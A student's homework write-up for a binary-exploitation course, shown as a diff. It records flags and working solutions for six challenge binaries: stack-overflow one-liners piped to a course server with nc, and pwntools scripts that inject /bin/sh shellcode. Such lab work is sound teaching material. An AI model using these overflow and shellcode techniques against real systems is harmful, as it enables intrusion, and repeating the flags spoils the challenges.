@@ -1,0 +1,83 @@
+Remi Trettin
+CIS4930
+HW 9
+
+prob1
+FLAG: flag{L3t_th3_G4mEz_B3g1n}
+Solution: This problem just took the user input and went to that location for execution. To get the flag, the address of the printFlag function had to be found. Then, this could be solved in one line.
+
+python -c 'print "\xfb\x85\x04\x08"' | nc pwn.n0l3ptr.com 9980
+
+prob2
+FLAG: flag{ImpR3SS1v3...C4n_Y0u_k33p_1T_Up?}
+Solution: This problem checked the value of a variable to print the flag. I opened the binary in r2 to see the comparison was to 0xFFFF. The variable was set to 0 but never changed within the program. I used a cyclic to see where I needed to insert 0xFFFF to overwrite the variable to the value I wanted.
+
+cyclic: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT
+
+The variable was overwritten after CCDD so the one-liner for this problem is:
+
+python -c 'print "AAAABBBBCCCCDD\xFF\xFF\x00\x00"' | nc pwn.n0l3ptr.com 9981
+
+prob3
+FLAG: flag{Y0u_G0t_th14_N00b}
+Solution: I ran the binary and saw it printed a return address. I looked at the disassembly in r2 and saw the printStack function. I assumed that function did print the stack and the current return address. I used a cyclic as test input to see where the return address had to be changed.
+
+cyclic: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT
+
+The return address was overwritten at LLKK. I found the address of the printFlag function to be 0x080485CB. The one-liner for this problem is:
+
+python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKK\xcb\x85\x04\x08"' | nc pwn.n0l3ptr.com 9982
+
+prob4
+FLAG: flag{N0w_th3_Gam3z_H4v3_r34LLy_st4rt3d}
+Solution: I looked at the binary source to see what was happening with this one. I used another cyclic to find the offset.
+
+cyclic: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD
+
+The address of the printFlag function is 0x080485CB. One-liner:
+
+python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\xcb\x85\x04\x08"' | nc pwn.n0l3ptr.com 9983
+
+prob5
+FLAG: flag{Alr1ght_y0u_4r3_g3tt1ng_there}
+Solution: For this problem I used objdump to get the offset of the buffer as 0x204. I ran the binary in gdb to see what happens to my input. I noticed that it just sets EIP. The goal is to set EIP to the address of the shellcode stored on the stack. I wrote a python script to calculate the correct address and go there to get the shell.
+
+from pwn import *
+context(arch='i386', os='linux')
+
+bin = process('./where2')
+
+# REMOTE
+# bin = remote('pwn.n0l3ptr.com', 9984)
+
+line = bin.recv()
+print line
+addr = int(line.split(' = ')[1][:-3], 16)
+print hex(addr)
+offset = addr - 0x204
+offset = offset + 12
+bin.send(p32(offset))
+bin.interactive()
+
+prob6
+FLAG: flag{W3lc0M3_T0_PWN_M4y_th3_0dds_Ev3r_B3_1n_Y0ur_f4v0r}
+Solution: I used objdump to get the offset of 0xC for the dummy variable and 0x400 for the buffer variable. I used another cyclic to find the offset of 1040. I used the 28 byte shellcode from pwntools and filled the rest of the buffer with 1012 bytes of garbage. Then I calculated the address of the shellcode and set EIP to that value.
+
+from pwn import *
+context(arch='i386', os='linux')
+
+bin = process('./pwn_me')
+
+# REMOTE
+# bin = remote('pwn.n0l3ptr.com', 9985)
+
+line = bin.recv()
+print line
+addr = int(line.split(' = ')[1][:-3], 16)
+addr = addr - 0x400
+shellcode = asm(shellcraft.i386.linux.execve('/bin/sh', 0, 0))
+exploit = shellcode
+exploit += 'A'*1012
+exploit += p32(addr)
+bin.sendline(exploit)
+bin.interactive()
